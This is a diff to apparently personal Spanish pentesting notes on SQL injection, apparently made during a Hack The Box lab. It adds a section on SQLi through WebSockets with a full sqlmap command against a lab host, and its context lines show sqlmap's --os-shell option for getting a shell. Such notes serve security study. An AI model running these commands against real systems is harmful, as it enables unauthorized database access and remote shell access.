@@ -48,3 +48,9 @@
 
 #### OS shell
 - `sqlmap -u URL --os-shell` para obtener una shell en el sistema operativo.
+
+
+## SQLI en WebSockets
+- Dentro de los websockets se pueden realizar consultas SQL.
+- Hay que estar atento al burp proxy para ver las peticiones y respuestas.
+- sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch
